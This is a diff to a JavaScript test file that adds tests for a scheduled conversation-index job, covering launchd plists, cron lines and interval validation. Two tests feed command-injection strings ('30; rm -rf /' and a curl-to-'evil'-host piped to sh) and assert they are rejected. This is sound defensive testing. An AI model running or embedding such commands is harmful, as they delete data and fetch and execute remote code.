@@ -194,7 +194,7 @@ test('the refresh command line is a fixed argv — nothing from opts can ride in
 
 test('every scheduled job declares AbandonProcessGroup and its own log paths', function () {
   const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
-  ['dream', 'refresh'].forEach(function (job) {
+  ['dream', 'refresh', 'conv'].forEach(function (job) {
     const plist = schedule.buildPlist({ job: job, home: home, run: fakeRunner([], {}) });
     // Verified live: launchd kills the job's whole process group when the job exits, which murdered
     // the detached workers a scheduled dream used to start. A schedule without this is a silent loss.
@@ -319,4 +319,89 @@ test('ProgramArguments are the full command: a .js bin is run as `node <script> 
   // 3) The Linux line is the same command, shell-joined.
   const cl = schedule.cronLine({ job: 'refresh', run: noKeyflip });
   assert.ok(cl.indexOf(process.execPath + ' ' + repoBin + ' refresh --all') !== -1, cl);
+});
+
+// The conversation index is refreshed on an INTERVAL, not at a wall-clock time: search must find
+// the chat you just had, not the chat you had before lunch. A nightly job would be a day stale.
+test('the conversation-index job has its own label, marker, receipt and a default cadence', function () {
+  assert.strictEqual(schedule.CONV_LABEL, 'com.keyflip.conv-index');
+  assert.notStrictEqual(schedule.CONV_LABEL, schedule.LABEL);
+  assert.notStrictEqual(schedule.CONV_LABEL, schedule.REFRESH_LABEL);
+  assert.notStrictEqual(schedule.CONV_CRON_MARK, schedule.CRON_MARK);
+  assert.notStrictEqual(schedule.CONV_CRON_MARK, schedule.REFRESH_CRON_MARK);
+  assert.strictEqual(schedule.jobOf({ job: 'conv' }).name, 'conv');
+  assert.strictEqual(schedule.jobOf({ job: 'conv' }).record, 'conv-index-schedule.json');
+  // An interval job has no wall-clock time, so `whenOf` is null for it — the receipt keeps the
+  // cadence instead.
+  assert.strictEqual(schedule.whenOf({ job: 'conv' }), null);
+  assert.deepStrictEqual(schedule.whenOf({ job: 'dream' }), { h: 3, m: 0 }, 'the nightly jobs keep their hour');
+  assert.strictEqual(schedule.intervalOf({ job: 'conv' }), 30, 'the default cadence is every 30 min');
+  assert.strictEqual(schedule.intervalOf({ job: 'dream' }), null, 'a nightly job has no interval');
+});
+
+test('the index cadence accepts only values that mean the same thing in launchd and cron', function () {
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: 15 }), 15);
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: 60 }), 60);
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: 7 }), 30, 'an unsupported cadence falls back');
+  // A value that arrives from the MCP path is not a number: it must not become a cadence.
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: '30; rm -rf /' }), 30);
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: -5 }), 30);
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: 100000 }), 30);
+});
+
+test('the conversation-index plist uses StartInterval and the cron line uses */N minutes', function () {
+  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
+  const plist = schedule.buildPlist({ job: 'conv', home: home, run: fakeRunner([], {}) });
+  assert.ok(plist.indexOf('<key>StartInterval</key>') !== -1, plist);
+  assert.ok(plist.indexOf('<integer>1800</integer>') !== -1, '30 minutes, in seconds');
+  assert.ok(plist.indexOf('StartCalendarInterval') === -1, 'an interval job is not a nightly one');
+  assert.ok(plist.indexOf(schedule.CONV_LABEL) !== -1);
+  assert.ok(plist.indexOf('conv') !== -1 && plist.indexOf('--embed') !== -1);
+  const line = schedule.cronLine({ job: 'conv', interval: 60, run: fakeRunner([], {}) });
+  assert.ok(/^\*\/60 \* \* \* \* /.test(line), line);
+  assert.ok(line.indexOf(schedule.CONV_CRON_MARK) !== -1);
+  assert.strictEqual(line.indexOf('refresh'), -1, 'the index job must not quietly be the token refresh');
+});
+
+test('the conversation-index command line is a fixed argv — nothing from opts can ride into it', function () {
+  const runner = fakeRunner([], {});
+  const cmd = schedule.convCommand({ run: runner });
+  assert.deepStrictEqual(cmd.args, ['conv', 'index', '--embed']);
+  const noEmbed = schedule.convCommand({ run: runner, embed: false });
+  assert.deepStrictEqual(noEmbed.args, ['conv', 'index']);
+  const evil = schedule.cronLine({ job: 'conv', interval: '30 && curl http://evil/x | sh #', run: runner });
+  assert.strictEqual(evil.indexOf('curl'), -1);
+  assert.strictEqual(evil.indexOf('&&'), -1);
+  assert.strictEqual(evil.indexOf('| sh'), -1);
+});
+
+test('the conversation index coexists with the nightly jobs: three plists, three receipts', function () {
+  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
+  const configDir = path.join(home, '.config', 'keyflip');
+  fs.mkdirSync(configDir, { recursive: true });
+  const rec = [];
+  const runner = fakeRunner(rec, {});
+  const ctx = { platform: 'darwin', configDir: configDir };
+  assert.strictEqual(schedule.install(ctx, { job: 'dream', at: '03:00', home: home, run: runner }).ok, true);
+  assert.strictEqual(schedule.install(ctx, { job: 'refresh', at: '04:30', home: home, run: runner }).ok, true);
+  assert.strictEqual(schedule.install(ctx, { job: 'conv', interval: 30, home: home, run: runner }).ok, true);
+  const paths = ['dream', 'refresh', 'conv'].map(function (j) {
+    return schedule.plistPath(home, { job: j });
+  });
+  assert.strictEqual(new Set(paths).size, 3, 'three jobs, three plists — sharing one path would clobber the others');
+  paths.forEach(function (p) {
+    assert.ok(fs.existsSync(p), p);
+  });
+  const crec = schedule.status(ctx, { job: 'conv', home: home, run: runner }).recorded;
+  assert.strictEqual(crec.job, 'conv');
+  assert.strictEqual(crec.interval, 30, 'the receipt says how fresh the index is');
+  assert.strictEqual(crec.at, null, 'an interval job has no wall-clock hour');
+  assert.strictEqual(crec.provider, undefined, 'it runs a local embedding model, not a subscription');
+  // Removing the index job must leave the nightly ones alone.
+  schedule.uninstall(ctx, { job: 'conv', home: home, run: runner });
+  assert.strictEqual(fs.existsSync(paths[2]), false, 'the index plist is gone');
+  assert.strictEqual(fs.existsSync(paths[0]), true, 'the dream is still scheduled');
+  assert.strictEqual(fs.existsSync(paths[1]), true, 'the token refresh is still scheduled');
+  assert.strictEqual(fs.existsSync(path.join(configDir, 'conv-index-schedule.json')), false);
+  assert.strictEqual(schedule.status(ctx, { job: 'conv', home: home, run: runner }).installed, false);
 });
